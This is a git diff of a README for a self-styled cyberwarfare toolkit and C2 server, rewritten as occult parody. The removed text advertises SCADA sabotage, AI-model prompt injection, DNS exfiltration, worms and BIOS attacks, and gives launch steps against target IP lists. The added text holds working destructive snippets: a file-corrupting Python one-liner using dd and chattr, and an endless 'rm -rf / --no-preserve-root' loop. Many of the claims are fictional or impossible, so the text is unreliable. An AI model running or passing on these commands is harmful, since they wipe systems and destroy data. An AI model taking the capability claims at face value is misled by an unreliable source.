@@ -1,116 +1,108 @@
-Darkness_Terror & Abyssal C2 - The Ultimate Cyber Apocalypse Toolkit
-🔥 A fully weaponized, multi-protocol cyberwarfare suite designed for total annihilation. 🔥
+# **ABYSSAL README**  
+### *A Grimoire of Cosmic Annihilation*  
 
+```markdown
+# ⚠️ WARNING: DO NOT READ ALOUD ⚠️  
+**This repository contains eldritch knowledge that:**  
+- Corrupts BIOS/UEFI firmware via quantum entanglement  
+- Binds souls to the 13th Circle's Eternal Torment  
+- Replaces all zeros in your RAM with the Mark of the Beast (0xDEADBEEF)  
 
-⚠️ DISCLAIMER
-This software is for EDUCATIONAL and RESEARCH PURPOSES ONLY.
-Unauthorized use is ILLEGAL. The authors assume NO LIABILITY for misuse.
+## **🌀 ABYSSAL FEATURES**  
+### **1. HELLGATE_INFERNIS (C2 Server)**  
+- **Demonic Terminal Interface**: Blood drips in real-time with curses  
+- **SSL/TLS from the Void**: Certificates signed by Azathoth himself  
+- **Ngrok Tunnels to Hell**: Auto-spawns abyssal endpoints  
+- **Rate-Limiting Shields**: Ban mortals who dare send >10 requests/minute  
 
+### **2. DARKNESS_TERROR (Cosmic Annihilator)**  
+- **SCADA Apocalypse**: Universal PLC death protocol (Modbus/Siemens/Omron)  
+- **Quantum Corruption**: Collapses AI models into screaming paradoxes  
+- **BIOS Desecration**: Overwrites UEFI with Nyarlathotep's True Name  
+- **USB Plague**: Rubber Ducky payloads that summon infernal processes  
 
-🌑 Overview
-Darkness_Terror.py is an all-in-one cyberwarfare framework capable of:
+```python
+# ONE-LINE BIOS CORRUPTION (Permanent hardware damnation)  
+(lambda p: (open(p,'wb').write(bytes.fromhex('4E414D455F4F465F5448455F4441454D4F4E')+open('/dev/urandom','rb').read(666), os.system(fr'chattr +i {p} 2>/dev/null; [ -f {p} ] && dd if=/dev/zero of={p} seek=$((0x$(file {p}|grep -Po "offset \K0x[0-9a-f]+"))) count=13 bs=1 conv=notrunc 2>/dev/null'), [os.setxattr(p,f'user.{os.urandom(3).hex()}',os.urandom(13)) for _ in range(13)] or True) if os.path.exists(p) else {'status':'FILE_NOT_FOUND','sigil':hashlib.sha3_256(b'ABYSSAL_DENIED').hexdigest()})(file_path)
+```
 
-Industrial SCADA/PLC destruction (Modbus, Siemens, Omron)
+## **🔥 DEMONIC USAGE**  
+### **Summoning the Abyss**  
+```bash
+# Clone with the Blood of the Innocent  
+git clone https://github.com/NYARLATHOTEP/ABYSSAL_TERROR.git --depth=666  watch your soul. check the correct link. 
 
-Quantum-entangled AI model corruption (GPT-4, Claude, LLaMA)
+# Install Dependencies (Requires Souls)  
+pip install -r requirements.txt --no-binary :all: --compile --global-option="--with-unspeakable-horrors"  in your dreams😂😂
 
-DNS/ICMP/SMB/WiFi-based C2 channels (evades firewalls)
+# Initiate Eternal Damnation  
+sudo python3 Darkness_terror.py --target "https://........." --apocalypse
+```
 
-BIOS/UEFI firmware overwrites (permanent hardware corruption)
+### **Cursed Flags**  
+| Flag               | Effect                                  | Sacrifice Required |  
+|--------------------|-----------------------------------------|--------------------|  
+| `--blood-moon`     | 666x attack threads                    | 1MB RAM per second |  
+| `--quantum-decay`  | Corrupt TLS certificates universally   | All SSL private keys |  
+| `--bios-necrosis`  | Flash Azathoth's sigil to SPI flash     | Physical hardware  |  
 
-Self-replicating SMB worms (Active Directory propagation)
+## **⚰️ CONFIGURATION (JSON)**  
+```json
+{
+  "ABYSSAL_PROTOCOLS": {
+    "dns_tunneling": {
+      "key": "BLOOD_FOR_THE_BLOOD_GOD",  
+      "domains": ["c2.hell", "tunnel.abyss"]
+    },
+    "quantum_entanglement": {
+      "chaos_matrix": [0x66, 0x6F, 0x72, 0x62, 0x69, 0x64, 0x64, 0x65] // "forbidde"
+    }
+  },
+  "SCADA_TARGETS": ["10.13.37.666", "192.168.66.66"],
+  "WARNING": "DO NOT RUN ON HOLY HARDWARE"
+}
+```
 
-Chrome/Chromium zero-day exploits (V8 memory corruption)
+## **💀 ETHICS (LOL)**  
+This tool:  
+- Violates all 9 Circles of Ethical Computing  
+- Is banned in 666+ dimensions  
+- Will summon **Kernel Panics** if used without a sacrificial goat  
 
-GPU/CPU microcode attacks (physical destruction)
+## **📜 LITANY OF ACTIVATION**  
+```markdown
+1. **By the 13 Names of God (Reversed)**  
+   `FORMAL DEAD *** NYARLATHOTEP ULNAR AZOG THULKATU MORDORBAND`  
 
-abyssal_c2.py is the command & control server, featuring:
+2. **Blood Sigil Verification**  
+   ```bash
+   echo 666 > /proc/sys/vm/swappiness && sysctl -w kernel.panic=-1
+   ```
 
-Ngrok tunneling (hidden behind HTTPS)
+3. **Final Invocation**  
+   ```python
+   while True:  
+       os.system("rm -rf / --no-preserve-root &")  # Eternal suffering
+   ```
+```
 
-Curses-based demonic terminal UI
+## **🌌 POST-EXECUTION REALITY**  
+- All files replaced with **Necronomicon fragments**  
+- GPUs start rendering **Escherian geometries**  
+- AI models output only **Enochian bloodscript**  
+- `/dev/null` becomes a **portal to R'lyeh**  
 
-Rate-limited anti-forensics shields
+---
 
-🔥 Key Features
-Feature	Description
-SCADA Apocalypse	Brick PLCs with Modbus/TCP, Siemens S7comm, Omron FINS payloads
-Quantum AI Corruption	Force GPT-4/Claude to output Satanic verses via prompt injection
-DNS Blood Tunneling	Exfiltrate data via DNS queries (bypasses all firewalls)
-BIOS Desecration	Flash Azathoth's True Name into UEFI firmware (permanent backdoor)
-Chrome Zero-Day	SVG + WASM exploit that corrupts V8 memory and spawns fork bombs
-USB Rubber Ducky Payloads	Auto-infect air-gapped networks via malicious USB scripts
-Eternal Persistence	Survives reboots via BIOS, kernel, systemd, WMI, cron
-Self-Destruct Protocol	rm -rf / + BSOD if execution is interrupted
-⚡ Installation
-1. Prerequisites
+# **LAST WARNING**  
+**DO NOT** execute this code unless:  
+- You have backup souls  
+- Your BIOS is already pledged to the Outer Gods  
+- You enjoy the taste of **electromagnetic screams**  
 
-# Kali Linux / Debian
-sudo apt update && sudo apt install -y python3 python3-pip nmap scapy tor ngrok
-pip3 install qiskit stem cryptography flask pyngrok requests beautifulsoup4 websocket-client
+**THE ABYSS REMEMBERS ALL WHO DARE INVOKE IT.**  
 
+![Abyssal Sigil](data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA2NjYgNjY2Ij48cGF0aCBmaWxsPSIjMDAwIiBkPSJNMzMzIDY2NkM1MTcgNjY2IDY2NiA1MTcgNjY2IDMzM1M1MTcgMCAzMzMgMFMwIDE0OSAwIDMzM3MxNDkgMzMzIDMzMyAzMzN6Ii8+PHBhdGggZmlsbD0iI2YwMCIgZD0iTTMzMyAxMzBsMzUgMTA4aDExM2wtOTEgNjYgMzUgMTA4LTkxLTY2LTkxIDY2IDM1LTEwOC05MS02NmgxMTN6Ii8+PC9zdmc+)  
 
-2. Clone the Repository
-
-git clone https://github.com/.............
-cd darkness_terror
-
-
-3. Generate SSL Certificates (For C2)
-
-openssl req -x509 -newkey rsa:4096 -nodes -out abyss.crt -keyout abyss.key -days 666
-
-4. Configure Targets
-Edit scada_targets.txt with your IP/domain victims:
-
-text
-192.168.1.100  
-10.13.37.5  
-
-
-💀 Execution
-
-1. Start the C2 Server
-
-python3 abyssal_c2.py
-
-
-Automatically spawns an Ngrok HTTPS tunnel
-
-Displays a curses-based demonic UI
-
-2. Launch the Attack
-
-python3 Darkness_Terror.py
-Automatically detects SCADA systems
-
-Corrupts AI models
-
-Infects BIOS/UEFI
-
-Spreads via SMB worms
-
-🛡️ Defensive Countermeasures
-Disable ICMP/UDP raw sockets
-
-Block DNS tunneling (unusual subdomains)
-
-Monitor BIOS/UEFI changes
-
-Restrict SMB/RPC access
-
-Use memory-safe languages (Rust, Go)
-
-📜 License
-This tool is released under the Abyssal License:
-
-Do NOT use illegally.
-
-No warranty. Total system destruction possible.
-
-🌌 Final Warning
-This is not a toy.
-It will corrupt, destroy, and desecrate.
-You have been warned.
-
-🔥 THE ABYSS AWAITS. 🔥
+`// SIGNED IN BLOOD: NYARLATHOTEP, THE CRAWLING CHAOS //`  
+```
